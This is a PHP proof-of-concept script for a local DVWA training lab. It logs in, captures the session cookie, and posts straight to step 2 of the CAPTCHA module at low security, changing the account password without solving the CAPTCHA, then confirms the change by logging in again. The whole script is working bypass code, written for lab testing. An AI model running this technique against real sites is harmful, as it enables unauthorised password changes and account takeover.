<?php

declare(strict_types=1);

$base = 'http://127.0.0.1';
$user = getenv('DVWA_LAB_USER') ?: 'admin';
$initialPassword = getenv('DVWA_LAB_INITIAL_PASSWORD') ?: '';
$newPassword = getenv('DVWA_LAB_TEST_PASSWORD') ?: '';
if ($initialPassword === '' || $newPassword === '') {
    fwrite(STDERR, "Set explicit sandbox-only login and test password environment variables.\n");
    exit(2);
}

function requestPage($handle, string $url, ?array $fields = null): array
{
    curl_setopt($handle, CURLOPT_URL, $url);
    curl_setopt($handle, CURLOPT_POST, $fields !== null);
    curl_setopt($handle, CURLOPT_POSTFIELDS, $fields === null ? null : http_build_query($fields));
    $body = curl_exec($handle);
    if ($body === false) {
        throw new RuntimeException('HTTP request failed: ' . curl_error($handle));
    }
    return [$body, (int)curl_getinfo($handle, CURLINFO_HTTP_CODE), (string)curl_getinfo($handle, CURLINFO_EFFECTIVE_URL)];
}

function extractToken(string $html): string
{
    if (!preg_match('/<input\\b[^>]*name=[\'\"]user_token[\'\"][^>]*value=[\'\"]([^\'\"]+)/i', $html, $m)) {
        throw new RuntimeException('user_token input not found');
    }
    return html_entity_decode($m[1], ENT_QUOTES | ENT_HTML5, 'UTF-8');
}

function newCurl(?string $cookieFile = null)
{
    $c = curl_init();
    curl_setopt_array($c, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 12,
        CURLOPT_COOKIEFILE => $cookieFile ?? '',
        CURLOPT_COOKIEJAR => $cookieFile ?? '',
        CURLOPT_USERAGENT => 'DVWA-local-isolated-test/1.0',
    ]);
    return $c;
}

function loginWorks(string $base, string $user, string $password): bool
{
    $cookieFile = tempnam(sys_get_temp_dir(), 'dvwa-captcha-login-');
    $c = newCurl($cookieFile);
    try {
        [$page] = requestPage($c, $base . '/login.php');
        $token = extractToken($page);
        [$body, $status, $url] = requestPage($c, $base . '/login.php', [
            'username' => $user,
            'password' => $password,
            'Login' => 'Login',
            'user_token' => $token,
        ]);
        return $status === 200 && stripos($body, 'Login failed') === false && !str_contains($url, 'login.php');
    } finally {
        @unlink($cookieFile);
    }
}

$cookieFile = tempnam(sys_get_temp_dir(), 'dvwa-captcha-setup-');
$c = newCurl($cookieFile);
try {
    [$setupPage] = requestPage($c, $base . '/setup.php');
    $setupToken = extractToken($setupPage);
    [$setupResult, $setupStatus] = requestPage($c, $base . '/setup.php', [
        'create_db' => 'Create / Reset Database',
        'user_token' => $setupToken,
    ]);
    if ($setupStatus !== 200) {
        throw new RuntimeException('Database setup did not return HTTP 200');
    }
    echo "sandbox database setup: HTTP 200\n";

    [$loginPage] = requestPage($c, $base . '/login.php');
    $loginToken = extractToken($loginPage);
    [$loginBody, $loginStatus, $loginUrl] = requestPage($c, $base . '/login.php', [
        'username' => $user,
        'password' => $initialPassword,
        'Login' => 'Login',
        'user_token' => $loginToken,
    ]);
    if ($loginStatus !== 200 || stripos($loginBody, 'Login failed') !== false || str_contains($loginUrl, 'login.php')) {
        throw new RuntimeException('Default sandbox login failed; stopping before password-change request');
    }

    $sessionId = null;
    foreach (curl_getinfo($c, CURLINFO_COOKIELIST) ?: [] as $line) {
        $parts = explode("\t", $line);
        if (count($parts) >= 7 && $parts[5] === 'PHPSESSID') {
            $sessionId = $parts[6];
        }
    }
    if ($sessionId === null || !preg_match('/^[A-Za-z0-9,-]+$/', $sessionId)) {
        throw new RuntimeException('Could not safely identify the authenticated session cookie');
    }

    $module = curl_init($base . '/vulnerabilities/captcha/');
    curl_setopt_array($module, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3,
        CURLOPT_CONNECTTIMEOUT => 4,
        CURLOPT_TIMEOUT => 12,
        CURLOPT_COOKIE => 'PHPSESSID=' . $sessionId . '; security=low',
        CURLOPT_USERAGENT => 'DVWA-local-isolated-test/1.0',
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'step' => '2',
            'password_new' => $newPassword,
            'password_conf' => $newPassword,
            'Change' => 'Change',
        ]),
    ]);
    $moduleBody = curl_exec($module);
    if ($moduleBody === false) {
        throw new RuntimeException('Low step-2 request failed: ' . curl_error($module));
    }
    $moduleStatus = (int)curl_getinfo($module, CURLINFO_HTTP_CODE);
    echo "Low direct step=2 POST: HTTP {$moduleStatus}; CAPTCHA fields omitted\n";

    if (!loginWorks($base, $user, $newPassword)) {
        throw new RuntimeException('New password did not authenticate; bypass not confirmed');
    }
    echo "LOW_CAPTCHA_BYPASS_CONFIRMED: password changed without submitting CAPTCHA\n";
} finally {
    @unlink($cookieFile);
}
